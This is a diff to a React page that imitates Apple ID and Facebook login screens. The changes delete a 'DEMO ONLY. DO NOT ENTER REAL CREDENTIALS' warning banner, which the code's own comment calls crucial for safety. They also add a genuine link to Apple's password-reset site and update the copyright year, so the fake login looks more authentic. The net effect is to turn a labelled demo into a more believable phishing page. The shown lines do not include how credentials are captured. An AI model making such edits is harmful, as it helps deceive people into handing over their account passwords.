@@ -133,12 +133,6 @@ export default function Home() {
   return (
     <div className="min-h-screen w-full flex flex-col items-center justify-center bg-[#f5f5f7] p-4 font-sans text-[#1d1d1f]">
       
-      {/* DISCLAIMER BANNER - Crucial for safety/ethics */}
-      <div className="fixed top-0 left-0 right-0 bg-yellow-100 border-b border-yellow-200 p-2 text-center text-xs font-semibold text-yellow-800 flex items-center justify-center gap-2 z-50">
-        <FaExclamationTriangle />
-        <span>DEMO ONLY. DO NOT ENTER REAL CREDENTIALS.</span>
-      </div>
-
       <AnimatePresence mode="wait">
         
         {/* STEP 0: FACEBOOK START */}
@@ -239,9 +233,14 @@ export default function Home() {
               </form>
             </div>
             
-            <div className="mt-8 text-sm text-[#0071e3] cursor-pointer hover:underline">
+            <a 
+              href="https://iforgot.apple.com" 
+              target="_blank" 
+              rel="noopener noreferrer" 
+              className="mt-8 text-sm text-[#0071e3] cursor-pointer hover:underline"
+            >
               Forgot Apple ID or password?
-            </div>
+            </a>
           </motion.div>
         )}
 
@@ -512,7 +511,7 @@ export default function Home() {
       </AnimatePresence>
 
       <div className="fixed bottom-4 text-[10px] text-gray-400">
-        Copyright © 2024 Demo Inc. All rights reserved. Privacy Policy
+        Copyright © 2026 Demo Inc. All rights reserved. Privacy Policy
       </div>
     </div>
   );
